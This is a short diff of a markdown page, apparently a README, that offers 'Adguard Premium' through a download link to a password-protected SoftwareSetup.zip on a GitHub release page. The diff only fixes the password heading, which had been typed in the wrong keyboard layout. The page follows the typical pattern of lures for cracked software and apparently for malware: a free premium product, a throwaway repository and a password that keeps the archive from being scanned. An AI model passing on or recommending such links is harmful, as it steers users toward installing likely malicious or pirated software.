@@ -2,7 +2,7 @@
 # ✅ Link:
 [Download](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
 
-**ЗФЫЫЦЩКВЖ 2026** 
+**PASSWORD 2026** 
 
 # Adguard Premium
 
